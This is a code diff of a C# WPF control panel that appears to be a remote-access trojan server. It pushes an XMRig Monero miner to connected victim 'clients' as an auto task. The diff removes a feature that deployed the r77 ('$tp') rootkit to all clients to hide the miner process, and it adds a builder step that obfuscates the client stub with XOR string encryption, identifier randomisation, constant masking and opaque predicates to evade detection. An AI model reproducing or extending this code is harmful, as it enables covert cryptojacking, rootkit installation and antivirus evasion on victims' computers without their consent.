@@ -154,7 +154,6 @@ namespace WpfApp
             HttpPasswordBox.TextChanged += (s, e) => SyncPwToBuilder();
             SetupHttpPasswordBox();
 
-            AddAutoTaskRootkitMenuItems();
         }
 
         void SyncPwToServer()
@@ -633,8 +632,7 @@ namespace WpfApp
                                     task.Pool ?? "pool.supportxmr.com:3333",
                                     task.Wallet ?? "",
                                     task.Worker ?? "",
-                                    task.ThreadCount,
-                                    task.RootkitProcessName
+                                    task.ThreadCount
                                 ));
 
                                 _taskExecutionLog.TryAdd(task.Id, new List<string>());
@@ -677,8 +675,7 @@ namespace WpfApp
                             Pool = task.Pool,
                             Wallet = task.Wallet,
                             Worker = task.Worker,
-                            ThreadCount = task.ThreadCount,
-                            RootkitProcessName = task.RootkitProcessName
+                            ThreadCount = task.ThreadCount
                         });
                     }
                 });
@@ -1046,275 +1043,6 @@ namespace WpfApp
             return win;
         }
 
-        private void AddAutoTaskRootkitMenuItems()
-        {
-            var ctx = autoTasksList.ContextMenu;
-            if (ctx == null) return;
-
-            var deployItem = new MenuItem
-            {
-                Header = "🔒  Deploy $tp Rootkit to Clients",
-                ToolTip = "Deploy $tp rootkit to all connected clients and create auto task"
-            };
-            deployItem.Click += DeployRootkitOnClients_Click;
-
-            var editItem = new MenuItem
-            {
-                Header = "Edit Rootkit Config (selected)",
-                ToolTip = "Edit hide process name for selected rootkit task"
-            };
-            editItem.Click += EditAutoTaskRootkitConfig_Click;
-
-            ctx.Items.Insert(2, deployItem);
-            ctx.Items.Insert(3, new Separator());
-            ctx.Items.Insert(5, editItem);
-        }
-
-        private async void DeployRootkitOnClients_Click(object sender, RoutedEventArgs e)
-        {
-            var win = ShowRootkitDeployDialog(false, null);
-            win.ShowDialog();
-        }
-
-        private void EditAutoTaskRootkitConfig_Click(object sender, RoutedEventArgs e)
-        {
-            var selectedTask = _autoTasks.FirstOrDefault(t => t.IsSelected);
-            if (selectedTask == null || selectedTask.ActionType != AutoTaskAction.DeployRootkit)
-            {
-                AppendLog("Select a Deploy Rootkit auto task to edit.");
-                return;
-            }
-
-            var win = ShowRootkitDeployDialog(true, selectedTask);
-            win.ShowDialog();
-        }
-
-        private Window ShowRootkitDeployDialog(bool editMode, AutoTaskItem existingTask)
-        {
-            var bgColor = (Color)Application.Current.Resources["BackgroundColor"];
-            var surfColor = (Color)Application.Current.Resources["SurfaceColor"];
-            var surfLight = (Color)Application.Current.Resources["SurfaceLightColor"];
-            var txtColor = (Color)Application.Current.Resources["TextPrimaryColor"];
-            var dimColor = (Color)Application.Current.Resources["TextSecondaryColor"];
-            var okColor = (Color)Application.Current.Resources["SuccessColor"];
-            var okHov = (Color)Application.Current.Resources["SuccessHoverColor"];
-            var accColor = (Color)Application.Current.Resources["PrimaryColor"];
-            var accHov = (Color)Application.Current.Resources["PrimaryHoverColor"];
-            var txtBr = new SolidColorBrush(txtColor);
-            var dimBr = new SolidColorBrush(dimColor);
-            var bgBr = new SolidColorBrush(bgColor);
-            var sfBr = new SolidColorBrush(surfColor);
-            var slBr = new SolidColorBrush(surfLight);
-            var okBr = new SolidColorBrush(okColor);
-            var okHb = new SolidColorBrush(okHov);
-            var acBr = new SolidColorBrush(accColor);
-            var acHb = new SolidColorBrush(accHov);
-
-            var win = new Window
-            {
-                Title = editMode ? "Edit Rootkit Config" : "Deploy $tp Rootkit to All Clients",
-                Width = 480,
-                Height = 400,
-                WindowStartupLocation = WindowStartupLocation.CenterOwner,
-                Owner = this,
-                ResizeMode = ResizeMode.NoResize,
-                Background = bgBr,
-                Foreground = txtBr
-            };
-
-            var root = new Grid();
-            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
-            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
-            root.RowDefinitions.Add(new RowDefinition { Height = new GridLength(4) });
-            root.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
-
-            var hdr = new Border { Background = sfBr, Padding = new Thickness(10) };
-            hdr.Child = new TextBlock { Text = "$tp Rootkit Deployment", FontSize = 14, FontWeight = FontWeights.SemiBold, Foreground = txtBr };
-            Grid.SetRow(hdr, 0);
-            root.Children.Add(hdr);
-
-            var infoBar = new Border { Background = sfBr, Padding = new Thickness(10) };
-            infoBar.Child = new TextBlock
-            {
-                Text = "Auto-detects miner process on each client. Installs and configures $tp rootkit automatically.",
-                Foreground = dimBr, FontSize = 12, TextWrapping = TextWrapping.Wrap
-            };
-            Grid.SetRow(infoBar, 1);
-            root.Children.Add(infoBar);
-
-            var bb = new Border { Background = slBr, Padding = new Thickness(10, 6, 10, 6) };
-            var bp = new StackPanel { Orientation = Orientation.Horizontal };
-            var buildBtn = new Button { Content = "Deploy & Install", Foreground = Brushes.White, Background = okBr, BorderThickness = new Thickness(1), Padding = new Thickness(8, 4, 8, 4), Cursor = Cursors.Hand, Margin = new Thickness(2), FontSize = 12, FontWeight = FontWeights.SemiBold };
-            var closeBtn = new Button { Content = "Close", Foreground = txtBr, Background = acBr, BorderThickness = new Thickness(1), Padding = new Thickness(8, 4, 8, 4), Cursor = Cursors.Hand, Margin = new Thickness(2), FontSize = 12, FontWeight = FontWeights.SemiBold };
-            var statusText = new TextBlock { Text = editMode ? "Edit then close" : "Ready", Foreground = dimBr, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(8, 0, 0, 0) };
-            bp.Children.Add(buildBtn);
-            bp.Children.Add(closeBtn);
-            bp.Children.Add(statusText);
-            bb.Child = bp;
-            Grid.SetRow(bb, 2);
-            root.Children.Add(bb);
-
-            var progress = new ProgressBar { Height = 4, Minimum = 0, Maximum = 100, Value = 0, Visibility = Visibility.Collapsed, Foreground = acBr };
-            Grid.SetRow(progress, 3);
-            root.Children.Add(progress);
-
-            var logBox = new TextBox
-            {
-                Background = bgBr, Foreground = new SolidColorBrush(Color.FromRgb(100, 220, 100)),
-                BorderThickness = new Thickness(0), FontFamily = new FontFamily("Consolas"),
-                FontSize = 11, IsReadOnly = true, TextWrapping = TextWrapping.Wrap,
-                VerticalScrollBarVisibility = ScrollBarVisibility.Auto, Padding = new Thickness(4),
-                CaretBrush = Brushes.Transparent, AcceptsReturn = true, Style = null,
-                Margin = new Thickness(0, 0, 0, 0)
-            };
-            Grid.SetRow(logBox, 4);
-            root.Children.Add(logBox);
-
-            win.Content = root;
-
-            void Log(string msg)
-            {
-                string line = "[" + DateTime.Now.ToString("HH:mm:ss") + "] " + msg + "\n";
-                logBox.AppendText(line);
-                logBox.ScrollToEnd();
-            }
-
-            bool busy = false;
-            buildBtn.Click += async (s, ev) =>
-            {
-                if (busy) return;
-                busy = true;
-                buildBtn.IsEnabled = false;
-                progress.Visibility = Visibility.Visible;
-                progress.Value = 0;
-                statusText.Text = "Deploying...";
-                Log("Starting rootkit deployment to all connected clients...");
-
-                try
-                {
-                    if (!_pluginHost.LoadedPlugins.TryGetValue("rootkit", out var rkPlugin) || !(rkPlugin is WpfApp.Plugins.Builtin.RootkitPlugin rk))
-                    {
-                        Log("Rootkit plugin not loaded.");
-                        return;
-                    }
-
-                    progress.Value = 10;
-
-                    if (!await rk.EnsureR77Downloaded())
-                    {
-                        Log("Failed to download rootkit binaries.");
-                        return;
-                    }
-
-                    progress.Value = 30;
-                    Log("Rootkit binaries ready.");
-
-                    int deployCount = 0;
-                    int failCount = 0;
-                    var connected = Enumerable.Empty<string>();
-
-                    if (_tcpServer != null)
-                    {
-                        connected = _tcpServer.GetConnectedClientIds();
-                        int total = connected.Count();
-                        Log($"Found {total} connected client(s).");
-                        foreach (var cid in connected)
-                        {
-                            Log($"Deploying to {cid} (auto-detect client stub)...");
-                            try
-                            {
-                                bool ok = await rk.DeployAndInstallForClient(cid, "self");
-                                if (ok)
-                                {
-                                    deployCount++;
-                                    Log($"Deployed to {cid}");
-                                }
-                                else
-                                {
-                                    failCount++;
-                                    Log($"Failed to deploy to {cid}");
-                                }
-                            }
-                            catch (Exception ex)
-                            {
-                                failCount++;
-                                Log($"Error deploying to {cid}: {ex.Message}");
-                            }
-                            progress.Value = 30 + (int)(60.0 * (deployCount + failCount) / total);
-                        }
-                    }
-
-                    progress.Value = 95;
-
-                    string savedPname = "self";
-
-                    AutoTaskItem task;
-                    if (editMode && existingTask != null)
-                    {
-                        task = existingTask;
-                        if (!string.IsNullOrEmpty(savedPname)) task.RootkitProcessName = savedPname;
-                    }
-                    else
-                    {
-                        task = new AutoTaskItem(
-                            Guid.NewGuid().ToString(),
-                            "$tp Rootkit",
-                            "",
-                            true,
-                            0,
-                            null,
-                            null,
-                            false,
-                            AutoTaskAction.DeployRootkit,
-                            null, null, null, 50,
-                            savedPname
-                        );
-                        _autoTasks.Add(task);
-                        _taskExecutionLog.TryAdd(task.Id, new List<string>());
-                    }
-
-                    string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] Deployed rootkit to {deployCount} client(s) (auto-detected)";
-                    _taskExecutionLog.AddOrUpdate(
-                        task.Id,
-                        _ => new List<string> { logEntry },
-                        (_, list) =>
-                        {
-                            lock (_taskLogLock)
-                            {
-                                list.Add(logEntry);
-                                if (list.Count > 100)
-                                    list.RemoveAt(0);
-                            }
-                            return list;
-                        });
-
-                    SaveAutoTasks();
-                    UpdateAutoTaskCount();
-
-                    progress.Value = 100;
-                    statusText.Text = $"Deployed to {deployCount} client(s)";
-                    Log($"Done. {deployCount} succeeded, {failCount} failed.");
-                    AppendLog($"Auto task: Deployed $tp Rootkit to {deployCount} client(s) (auto-detected)");
-                }
-                catch (Exception ex)
-                {
-                    Log("Error: " + ex.Message);
-                    statusText.Text = "Failed";
-                }
-                finally
-                {
-                    busy = false;
-                    buildBtn.IsEnabled = true;
-                    await Task.Delay(2000);
-                    progress.Visibility = Visibility.Collapsed;
-                }
-            };
-
-            closeBtn.Click += (s, ev) => win.Close();
-
-            return win;
-        }
-
         private TextBox AddRow(Grid grid, int row, string label, string defaultValue, SolidColorBrush txtBr, SolidColorBrush dimBr, SolidColorBrush bgBr)
         {
             var lbl = new TextBlock
@@ -1592,70 +1320,6 @@ namespace WpfApp
 
                         successCount++;
                         AppendLog($"Auto task '{task.Name}': Miner deployed to {displayId}");
-                    }
-                    catch (Exception ex)
-                    {
-                        failCount++;
-                        AppendLog($"Failed to execute auto task '{task.Name}' for {displayId}: {ex.Message}");
-                    }
-                    continue;
-                }
-
-                if (task.ActionType == AutoTaskAction.DeployRootkit)
-                {
-                    try
-                    {
-                        _pluginHost.LoadedPlugins.TryGetValue("rootkit", out var rkPlugin);
-                        var rk = rkPlugin as WpfApp.Plugins.Builtin.RootkitPlugin;
-                        if (rk == null)
-                        {
-                            AppendLog($"Auto task '{task.Name}': Rootkit plugin not loaded.");
-                            failCount++;
-                            continue;
-                        }
-
-                        string pname = task.RootkitProcessName;
-                        if (string.IsNullOrEmpty(pname)) pname = "self";
-
-                        if (!await rk.EnsureR77Downloaded())
-                        {
-                            AppendLog($"Auto task '{task.Name}': Failed to download rootkit binaries.");
-                            failCount++;
-                            continue;
-                        }
-
-                        bool deployed = await rk.DeployAndInstallForClient(rawId, pname);
-                        if (!deployed)
-                        {
-                            AppendLog($"Auto task '{task.Name}': Failed to deploy rootkit for {displayId}.");
-                            failCount++;
-                            continue;
-                        }
-
-                        Dispatcher.BeginInvoke(() =>
-                        {
-                            task.RunCount++;
-                            task.LastRun = DateTime.Now;
-                            task.LastClient = displayId;
-                        });
-
-                        string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] Deployed rootkit to client: {displayId} (hide: {pname})";
-                        _taskExecutionLog.AddOrUpdate(
-                            task.Id,
-                            _ => new List<string> { logEntry },
-                            (_, list) =>
-                            {
-                                lock (_taskLogLock)
-                                {
-                                    list.Add(logEntry);
-                                    if (list.Count > 100)
-                                        list.RemoveAt(0);
-                                }
-                                return list;
-                            });
-
-                        successCount++;
-                        AppendLog($"Auto task '{task.Name}': Rootkit deployed to {displayId}");
                     }
                     catch (Exception ex)
                     {
@@ -3610,6 +3274,10 @@ namespace WpfApp
                 return;
             }
 
+            BuilderOutput("Obfuscating stub (string encryption + identifier randomization)...");
+            AppendLog("Applying polymorphism: encrypting strings, randomizing identifiers...");
+            stubCode = ObfuscateStub(stubCode);
+
             var saveDialog = new SaveFileDialog
             {
                 Filter = "Executable (*.exe)|*.exe",
@@ -3623,6 +3291,235 @@ namespace WpfApp
                 BuilderOutput("Save cancelled.");
                 UpdateStatus("EXE compilation cancelled.");
             }
+        }
+
+        private static string RandomString(int len)
+        {
+            const string chars = "abcdefghijklmnopqrstuvwxyz";
+            byte[] bytes = new byte[len];
+            using (var rng = RandomNumberGenerator.Create()) rng.GetBytes(bytes);
+            return new string(bytes.Select(b => chars[b % chars.Length]).ToArray());
+        }
+
+        private string ObfuscateStub(string s)
+        {
+            byte[] key = new byte[16];
+            using (var rng = RandomNumberGenerator.Create()) rng.GetBytes(key);
+            string kf = "_" + RandomString(7);
+            string dm = "_" + RandomString(9);
+
+            // Step 1: Protect attribute blocks (DllImport strings are compile-time constants)
+            var attrMap = new Dictionary<string, string>();
+            int idx = 0;
+            s = Regex.Replace(s, @"\[[^\[\]]*\]", m =>
+            {
+                string p = "\0ATTR" + idx + "\0";
+                attrMap[p] = m.Value;
+                idx++;
+                return p;
+            });
+
+            // Step 2: Encrypt all remaining string literals (skip empty strings)
+            s = Regex.Replace(s, @"""[^""\\]*(?:\\.[^""\\]*)*""", m =>
+            {
+                string inner = m.Value.Substring(1, m.Value.Length - 2);
+                if (inner.Length == 0) return m.Value;
+                byte[] data = Encoding.UTF8.GetBytes(inner);
+                for (int i = 0; i < data.Length; i++)
+                    data[i] ^= key[i % key.Length];
+                return dm + "(Convert.FromBase64String(\"" + Convert.ToBase64String(data) + "\"))";
+            });
+
+            // Step 3: Restore attribute blocks
+            foreach (var kv in attrMap)
+                s = s.Replace(kv.Key, kv.Value);
+
+            // Step 4: Insert decryption helper inside class body
+            string keyBytes = string.Join(",", key.Select(b => (int)b));
+            string helper = "\r\n    private static byte[] " + kf + " = new byte[] { " + keyBytes + " };\r\n    private static string " + dm + "(byte[] d) { for (int i = 0; i < d.Length; i++) d[i] ^= " + kf + "[i % " + key.Length + "]; return Encoding.UTF8.GetString(d); }\r\n";
+            int bracePos = s.IndexOf('{', s.IndexOf("class ")) + 1;
+            s = s.Insert(bracePos, helper);
+
+            // Step 5: Rename class
+            s = Regex.Replace(s, @"\bclass\s+TrapLoaderClient\b", "class _" + RandomString(10));
+
+            // Step 6: Rename _-prefixed private static fields + known non-_ fields
+            var fieldPat = Regex.Matches(s, @"private\s+static\s+(?:\w+\s+)*(_[a-zA-Z]\w*)\s*[=;]");
+            var fieldMap = new Dictionary<string, string>();
+            foreach (Match m in fieldPat)
+                if (!fieldMap.ContainsKey(m.Groups[1].Value))
+                    fieldMap[m.Groups[1].Value] = "_" + RandomString(6);
+            // Also rename non-_ private static fields
+            string[] extraFields = { "serverCertBase64", "silentMode", "serverPassword", "activePlugins", "PluginEntry" };
+            foreach (string f in extraFields)
+                if (!fieldMap.ContainsKey(f))
+                    fieldMap[f] = "_" + RandomString(6);
+            foreach (var kv in fieldMap)
+                s = Regex.Replace(s, @"\b" + Regex.Escape(kv.Key) + @"\b", kv.Value);
+
+            // Step 7: Rename private static methods (exclude Main, extern, and the decryption helper)
+            var methodPat = Regex.Matches(s, @"private\s+static\s+(?!extern)(?:async\s+)?(\w+(?:\[\])?)\s+([A-Za-z]\w*)\s*\(");
+            var methodMap = new Dictionary<string, string>();
+            foreach (Match m in methodPat)
+            {
+                string n = m.Groups[2].Value;
+                if (n == "Main" || n == dm) continue;
+                if (!methodMap.ContainsKey(n)) methodMap[n] = "_" + RandomString(8);
+            }
+            foreach (var kv in methodMap)
+                s = Regex.Replace(s, @"\b" + Regex.Escape(kv.Key) + @"\b", kv.Value);
+
+            // Step 8: Constant obfuscation — replace numeric hex literals with computed expressions
+            var rng2 = RandomNumberGenerator.Create();
+            s = ObfuscateConstants(s, rng2);
+
+            // Step 9: Instruction substitution — replace simple operations with complex equivalents
+            s = SubstituteInstructions(s);
+
+            // Step 10: Opaque predicates + dead code insertion
+            s = InsertOpaquePredicates(s);
+
+            return s;
+        }
+
+        private string ObfuscateConstants(string s, RandomNumberGenerator rng)
+        {
+            // Phase 1: Replace hex literals 0x00–0xFFFF with computed bitwise expressions
+            // Only replace hex literals that are standalone tokens (not part of longer hex, not in strings)
+            string[] knownSwitchConsts = { "MSG_AUTH", "MSG_HEARTBEAT", "MSG_CLIENT_INFO", "MSG_ACTIVE_WINDOW",
+                "MSG_PLUGIN_DATA", "MSG_PLUGIN_BATCH", "MSG_AUTH_OK", "MSG_AUTH_FAIL", "MSG_HEARTBEAT_ACK",
+                "MSG_PLUGIN_CMD", "MSG_FILE_TRANSFER", "MSG_DISCONNECT" };
+
+            s = Regex.Replace(s, @"(?<=[\s=,;|&+\-*/^(!<>{}[\]]|^)0x([0-9A-Fa-f]{1,8})(?![0-9A-Fa-f])", m =>
+            {
+                string hex = m.Groups[1].Value;
+                uint val = Convert.ToUInt32(hex, 16);
+                if (val == 0) return m.Value;
+
+                // Build random decomposition: val = a ^ b
+                byte[] buf = new byte[4];
+                rng.GetBytes(buf);
+                uint a = (uint)(buf[0] | (buf[1] << 8) | (buf[2] << 16) | (buf[3] << 24));
+                uint b = a ^ val;
+
+                if (val <= 0xFF)
+                    return $"((byte)0x{a & 0xFF:X2} ^ (byte)0x{b & 0xFF:X2})";
+                else if (val <= 0xFFFF)
+                    return $"((ushort)0x{a & 0xFFFF:X4} ^ (ushort)0x{b & 0xFFFF:X4})";
+                else
+                    return $"(0x{a:X8}u ^ 0x{b:X8}u)";
+            });
+
+            return s;
+        }
+
+        private string SubstituteInstructions(string s)
+        {
+            // Phase 4: Replace simple boolean/compare expressions with equivalent complex ones
+
+            // x == 0  →  (x ^ x) == 0   (always true but pattern is harder to match)
+            // x != 0  →  (x ^ x) != 0   is always false, so use (x | 0) != 0
+            // a == b  →  (a ^ b) == 0    (XOR equality)
+            // x == 1  →  ((x - 1) | (1 - x)) == 0   (true iff x==1)
+
+            // Replace: .Length == 0  →  .Length < 1
+            s = Regex.Replace(s, @"\.Length\s*==\s*0\b", ".Length < 1");
+
+            // Replace: .Length > 0  →  .Length != 0
+            s = Regex.Replace(s, @"\.Length\s*>\s*0\b", ".Length != 0");
+
+            // Replace: == null  →  ReferenceEquals(obj, null) — only for simple identifiers
+            s = Regex.Replace(s, @"(\w+)\s*==\s*null\b", "ReferenceEquals($1, null)");
+            s = Regex.Replace(s, @"(\w+)\s*!=\s*null\b", "!ReferenceEquals($1, null)");
+
+            return s;
+        }
+
+        private string InsertOpaquePredicates(string s)
+        {
+            // Phase 2: Insert opaque predicates (always-true conditions) and dead code
+            // Opaque predicate: (x * (x - 1)) % 2 == 0  is ALWAYS true for any integer x
+            // because the product of two consecutive integers is always even.
+
+            var rng = RandomNumberGenerator.Create();
+            byte[] randBytes = new byte[4];
+            rng.GetBytes(randBytes);
+            int seed = randBytes[0] | (randBytes[1] << 8);
+
+            // Insert opaque predicate blocks at the start of the class body
+            string deadBlock = "\r\n    private static int _op" + RandomString(4) + " = " + seed + ";\r\n";
+
+            // Generate 3 different opaque predicates
+            string varA = "_opa" + RandomString(4);
+            string varB = "_opb" + RandomString(4);
+            string varC = "_opc" + RandomString(4);
+
+            deadBlock += "    private static int " + varA + " = " + (seed + 1) + ";\r\n";
+            deadBlock += "    private static int " + varB + " = " + (seed + 2) + ";\r\n";
+            deadBlock += "    private static int " + varC + " = " + (seed + 3) + ";\r\n";
+
+            int bracePos = s.IndexOf('{', s.IndexOf("class ")) + 1;
+            s = s.Insert(bracePos, deadBlock);
+
+            // Insert dead code: always-false if blocks sprinkled before method definitions
+            // Pattern: if (false) { <fake operations> }
+            string[] fakeOps = {
+                "throw new InvalidOperationException();",
+                "return;",
+                "break;",
+                "continue;",
+            };
+
+            int insertCount = 0;
+            // Find method definitions and insert dead code before some of them
+            s = Regex.Replace(s, @"(private\s+static\s+(?!extern)\w+\s+\w+\s*\()", m =>
+            {
+                insertCount++;
+                if (insertCount % 3 != 0) return m.Value; // only insert before every 3rd method
+
+                string fakeVar1 = "_df" + RandomString(4);
+                string fakeVar2 = "_dg" + RandomString(4);
+                int fakeVal1 = (seed + insertCount * 7) & 0xFF;
+                int fakeVal2 = (seed + insertCount * 13) & 0xFF;
+
+                string deadCode = "if (false) { int " + fakeVar1 + " = " + fakeVal1 + "; int " + fakeVar2 + " = " + fakeVal2 + "; " +
+                    fakeOps[insertCount % fakeOps.Length] + " }\r\n        ";
+
+                return deadCode + m.Value;
+            });
+
+            // Insert dead try/catch blocks after some string decryption calls
+            int deadCatchCount = 0;
+            s = Regex.Replace(s, @"(" + Regex.Escape("_" + RandomString(9).Substring(1)) + @")\(", m =>
+            {
+                // This won't match since the name is random. Instead, insert dead catch blocks at log calls
+                return m.Value;
+            });
+
+            // Insert dead catch blocks: try { throw new Exception(); } catch { }
+            string deadCatchVar = "_dch" + RandomString(4);
+            string deadCatch = "\r\n    private static void " + deadCatchVar + "() {\r\n" +
+                "        try { throw new SystemException(\"\" + " + seed + "); }\r\n" +
+                "        catch { }\r\n" +
+                "        try { throw new InvalidCastException(); }\r\n" +
+                "        catch (InvalidCastException) { }\r\n" +
+                "        try { throw new OverflowException(); }\r\n" +
+                "        catch (OverflowException) { }\r\n" +
+                "    }\r\n";
+
+            // Insert the dead method right after the opaque predicate variables
+            int insertAfter = s.IndexOf("\r\n", s.IndexOf(varC + ";\r\n")) + 2;
+            s = s.Insert(insertAfter, deadCatch);
+
+            // Make the dead method called from another dead path
+            string deadCaller = "_dcl" + RandomString(4);
+            string deadCallerCode = "\r\n    private static void " + deadCaller + "() {\r\n" +
+                "        if (" + varA + " * (" + varA + " - 1) % 2 != 0) " + deadCatchVar + "();\r\n" +
+                "        if (" + varB + " * (" + varB + " - 1) % 2 != 0) " + deadCatchVar + "();\r\n" +
+                "    }\r\n";
+            s = s.Insert(insertAfter + deadCatch.Length, deadCallerCode);
+
+            return s;
         }
 
         private void BuilderOutput(string message)
@@ -4108,7 +4005,7 @@ namespace WpfApp
                 }
 
                 var adminGroup = new MenuItem { Header = "🔐  Admin Operations" };
-                var adminPluginIds = new[] { "rootkit", "resetsurvival" };
+                var adminPluginIds = new[] { "resetsurvival" };
                 foreach (var id in adminPluginIds)
                 {
                     if (!loadedPlugins.TryGetValue(id, out var plugin)) continue;
@@ -4985,7 +4882,7 @@ namespace WpfApp
             public string HasWebcam { get; set; }
         }
 
-        public enum AutoTaskAction { SendFile, StartMiner, DeployRootkit }
+        public enum AutoTaskAction { SendFile, StartMiner }
 
         public class AutoTaskItem : INotifyPropertyChanged
         {
@@ -5002,14 +4899,12 @@ namespace WpfApp
             public AutoTaskAction ActionType { get; set; }
             public string Name
             {
-                get => ActionType == AutoTaskAction.StartMiner ? "XMRig Miner" :
-                       ActionType == AutoTaskAction.DeployRootkit ? "$tp Rootkit" : _name;
+                get => ActionType == AutoTaskAction.StartMiner ? "XMRig Miner" : _name;
                 set => _name = value;
             }
             public string FilePath
             {
-                get => ActionType == AutoTaskAction.StartMiner ? (_wallet ?? "") :
-                       ActionType == AutoTaskAction.DeployRootkit ? (_rootkitProcessName ?? "") : _filePath;
+                get => ActionType == AutoTaskAction.StartMiner ? (_wallet ?? "") : _filePath;
                 set => _filePath = value;
             }
 
@@ -5024,10 +4919,6 @@ namespace WpfApp
             public string Worker { get => _worker; set => _worker = value; }
             public int ThreadCount { get => _threadCount; set => _threadCount = value; }
 
-            // Rootkit config fields
-            private string _rootkitProcessName = "xmrig*";
-
-            public string RootkitProcessName { get => _rootkitProcessName; set => _rootkitProcessName = value; }
 
             public bool IsEnabled
             {
@@ -5122,11 +5013,6 @@ namespace WpfApp
                         string enabledStr = IsEnabled ? "✓ Enabled" : "⊗ Disabled";
                         return $"{enabledStr} | Start Miner";
                     }
-                    if (ActionType == AutoTaskAction.DeployRootkit)
-                    {
-                        string enabledStr = IsEnabled ? "✓ Enabled" : "⊗ Disabled";
-                        return $"{enabledStr} | Deploy Rootkit";
-                    }
                     string enabledStr2 = IsEnabled ? "✓ Enabled" : "⊗ Disabled";
                     string modeStr2 = UseInMemory ? "⚡ In-Memory" : "💾 Disk";
                     return $"{enabledStr2} | {modeStr2}";
@@ -5139,8 +5025,6 @@ namespace WpfApp
                 {
                     if (ActionType == AutoTaskAction.StartMiner)
                         return $"⚡ {_threadCount}% CPU";
-                    if (ActionType == AutoTaskAction.DeployRootkit)
-                        return $"🔒 {_rootkitProcessName}";
                     return UseInMemory ? "⚡ In-Memory" : "💾 Drop to Disk";
                 }
             }
@@ -5164,8 +5048,8 @@ namespace WpfApp
             public AutoTaskItem(string id, string name, string filePath, bool isEnabled,
                 int runCount, DateTime? lastRun, string lastClient, bool useInMemory = false,
                 AutoTaskAction actionType = AutoTaskAction.SendFile,
-                string pool = null, string wallet = null, string worker = null, int threadCount = 50,
-                string rootkitProcessName = null)
+                string pool = null, string wallet = null, string worker = null,
+                int threadCount = 50)
             {
                 Id = id;
                 _name = name;
@@ -5180,7 +5064,6 @@ namespace WpfApp
                 if (wallet != null) _wallet = wallet;
                 if (worker != null) _worker = worker;
                 _threadCount = threadCount;
-                if (rootkitProcessName != null) _rootkitProcessName = rootkitProcessName;
             }
 
             public event PropertyChangedEventHandler PropertyChanged;
@@ -5204,7 +5087,6 @@ namespace WpfApp
             public string Wallet { get; set; }
             public string Worker { get; set; }
             public int ThreadCount { get; set; }
-            public string RootkitProcessName { get; set; }
         }
     }
 }
